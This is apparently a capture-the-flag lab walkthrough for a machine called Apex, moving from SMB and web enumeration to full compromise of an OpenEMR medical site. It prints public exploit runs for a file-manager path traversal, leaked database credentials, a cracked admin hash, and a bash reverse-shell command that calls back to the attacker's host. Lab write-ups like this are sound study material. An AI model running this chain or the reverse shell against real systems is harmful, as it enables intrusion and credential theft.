# Apex

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.183.145
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 22:07 +08
Nmap scan report for 192.168.183.145
Host is up (0.17s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
3306/tcp open  mysql
```

Interesting ports open.&#x20;

### SMB Enumeration

Using `smbmap`, we can find some shares that are open.

```
$ smbmap -H 192.168.183.145              
[+] Guest session       IP: 192.168.183.145:445 Name: 192.168.183.145                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        docs                                                    READ ONLY       Documents
        IPC$                                                    NO ACCESS       IPC Service (APEX server (Samba, Ubuntu))
```

The `docs` share just had some files related to OpenEMR:

```
$ smbclient -N //192.168.183.145/docs        
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Apr  9 23:47:12 2021
  ..                                  D        0  Fri Apr  9 23:47:12 2021
  OpenEMR Success Stories.pdf         A   290738  Fri Apr  9 23:47:12 2021
  OpenEMR Features.pdf                A   490355  Fri Apr  9 23:47:12 2021
```

### Web Enumeration -> FileManager LFI

Port 80 shows a medical website:

<figure><img src="../../../.gitbook/assets/image (3013).png" alt=""><figcaption></figcaption></figure>

SMB enumeration revealed that this website might be running a vulnerable version of OpenEMR, and there are quite a few RCE exploits for OpenEMR.

However, most of these require credentials. I scanned the website for potential directories to other services, and found a File Manager using `gobuster`:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.183.145 -t 100      
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.183.145
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/07/11 22:11:27 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 319] [--> http://192.168.183.145/assets/]
/thumbs               (Status: 301) [Size: 319] [--> http://192.168.183.145/thumbs/]
/source               (Status: 301) [Size: 319] [--> http://192.168.183.145/source/]
/filemanager          (Status: 301) [Size: 324] [--> http://192.168.183.145/filemanager/]
```

When we visit `/filemanager`, we can see that it is running Responsive FileManager:

<figure><img src="../../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

There are a few exploits related to this:

```
$ searchsploit responsive FileManager
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Responsive Filemanager 9.13.1 - Server-Side Request Forger | linux/webapps/45103.txt
Responsive FileManager 9.13.4 - 'path' Path Traversal      | php/webapps/49359.py
Responsive FileManager 9.13.4 - Multiple Vulnerabilities   | php/webapps/45987.txt
Responsive FileManager < 9.13.4 - Directory Traversal      | php/webapps/45271.txt
----------------------------------------------------------- ---------------------------------
```

The LFI works!

```
$ python3 49359.py http://192.168.183.145 PHPSESSID=86a4n0gbbc9klrmvq461tnfk8n /etc/passwd
[*] Copy Clipboard
[*] Paste Clipboard
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
<TRUNCATED>
```

### SQL Creds -> RCE

Since we have LFI, we can try reading the SQL credentials that are present within OpenEMR (based on reading the OpenEMR Github repository).&#x20;

{% embed url="https://github.com/openemr/openemr/blob/master/sites/default/sqlconf.php" %}

```
$ python3 49359.py http://192.168.183.145 PHPSESSID=86a4n0gbbc9klrmvq461tnfk8n /var/www/openemr/sites/default/sqlconf.php 
[*] Copy Clipboard
[*] Paste Clipboard
```

There was something blocking us from reading PHP files here, and its probably the `.htaccess` file. Within the FileManager instance, I noticed that the same PDFs on SMB were present within it.

<figure><img src="../../../.gitbook/assets/image (1510).png" alt=""><figcaption></figcaption></figure>

The LFI exploit copies and pastes files into directories, and this means that we should be able to read the file from the SMB share. We just need to modify the `paste_clipboard` function within the exploit:

<figure><img src="../../../.gitbook/assets/image (2875).png" alt=""><figcaption></figcaption></figure>

After changing the directories a few times, I got it within the SMB share:

```
$ python3 49359.py http://192.168.183.145 PHPSESSID=86a4n0gbbc9klrmvq461tnfk8n /var/www/openemr/sites/default/sqlconf.php
[*] Copy Clipboard
[*] Paste Clipboard

$ smbclient -N //192.168.183.145/docs
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 11 22:30:24 2023
  ..                                  D        0  Tue Jul 11 22:20:07 2023
  sqlconf.php                         N      639  Tue Jul 11 22:30:24 2023
  OpenEMR Success Stories.pdf         A   290738  Fri Apr  9 23:47:12 2021
  OpenEMR Features.pdf                A   490355  Fri Apr  9 23:47:12 2021
```

Here's its contents:

```php
$ cat sqlconf.php   
<?php
//  OpenEMR
//  MySQL Config

$host   = 'localhost';
$port   = '3306';
$login  = 'openemr';
$pass   = 'C78maEQUIEuQ';
$dbase  = 'openemr';
```

Now we have some SQL creds, we can login to the database present.&#x20;

<figure><img src="../../../.gitbook/assets/image (606).png" alt=""><figcaption></figcaption></figure>

We can then find the credentials for OpenEMR:

```
MariaDB [openemr]> select * from users_secure;
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
| id | username | password                                                     | salt                           | last_update         | password_history1 | salt_history1 | password_history2 | salt_history2 |
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
|  1 | admin    | $2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC | $2a$05$bJcIfCBjN5Fuh0K9qfoe0n$ | 2021-05-17 10:56:27 | NULL              | NULL          | NULL              | NULL          |
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
1 row in set (0.176 sec)
```

This hash can be cracked using `john`:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash     
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thedoctor        (?)     
1g 0:00:00:06 DONE (2023-07-11 22:36) 0.1474g/s 6430p/s 6430c/s 6430C/s versus..telmo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Afterwards, we can run the RCE exploit for OpenEMR:

{% code overflow="wrap" %}
```
$ python2 45161.py -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.184/4444 0>&1' http://192.168.183.145/openemr
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

The `root` user has the same password as the MySQL database of `thedoctor`:

<figure><img src="../../../.gitbook/assets/image (2575).png" alt=""><figcaption></figcaption></figure>
